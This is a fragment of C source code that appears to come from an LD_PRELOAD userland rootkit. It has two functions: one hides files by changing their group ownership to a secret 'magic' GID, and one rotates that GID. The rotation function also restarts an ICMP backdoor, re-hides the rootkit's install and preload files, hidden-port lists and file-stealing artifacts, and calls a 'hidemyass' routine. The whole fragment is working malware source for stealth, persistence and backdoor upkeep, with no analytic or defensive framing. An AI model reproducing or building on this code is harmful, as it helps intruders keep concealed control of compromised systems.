void hidedircontents(const char *path, gid_t newgid){
    DIR *dp;
    struct dirent *dir;

    hook(COPENDIR, CREADDIR);

    dp = call(COPENDIR, path);
    if(dp == NULL) return;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        char tmp[strlen(path)+strlen(dir->d_name)+3];
        snprintf(tmp, sizeof(tmp), "%s/%s", path, dir->d_name);
        chown_path(tmp, newgid);
    }
    closedir(dp);
    chown_path(path, newgid);
}


// creates a new magic ID.
// handles rehiding & respawning things that need it.
// returns the new magic ID when finished.
// curtime should be the result of a call to time(NULL).
// if AUTO_GID_CHANGER is defined then curtime is written to GIDTIME_PATH as the new time since last GID change.
gid_t changerkgid(int curtime){
    FILE *fp;
    gid_t newgid=0;
    char buf[32];
#if defined USE_ICMP_BD || defined HIDE_MY_ASS
    gid_t oldgid=readgid();
#endif
    int taken;

    hook(CFOPEN, CFWRITE, CCHMOD);

    srand(curtime);
    while((taken = gidtaken(newgid)))
        newgid = (gid_t)(rand() % (MAX_GID - MIN_GID + 1)) + MIN_GID;

    if(taken < 0)  // couldn't open /etc/group?
        newgid = MAGIC_GID;

    fp = call(CFOPEN, GID_PATH, "w");
    if(fp == NULL)
        return MAGIC_GID;
    memset(buf, 0, sizeof(buf));
    snprintf(buf, sizeof(buf), "%u", newgid);
    call(CFWRITE, buf, 1, strlen(buf), fp);
    fclose(fp);

#ifdef USE_ICMP_BD
    killrkprocs(oldgid-1);
    spawnpdoor();
#endif

    char *preloadpath = OLD_PRELOAD;
#ifdef PATCH_DYNAMIC_LINKER
    preloadpath = PRELOAD_FILE;
#endif
    chown_path(preloadpath, newgid);
    hidedircontents(INSTALL_DIR, newgid);
    hidedircontents(HOMEDIR, newgid);

    for(int i = 0; i != BDVPATHS_SIZE; i++)
        chown_path(bdvpaths[i], newgid);

#if defined FILE_STEAL && defined FILE_CLEANSE_TIMER
    chown_path(CLEANEDTIME_PATH, newgid);
#endif
#ifdef HIDE_PORTS
    chown_path(HIDEPORTS, newgid);
#endif
#ifdef HIDE_MY_ASS
    hidemyass(oldgid);
#endif
#ifdef AUTO_GID_CHANGER
    writenewtime(GIDTIME_PATH, curtime);
#endif
    return newgid;
}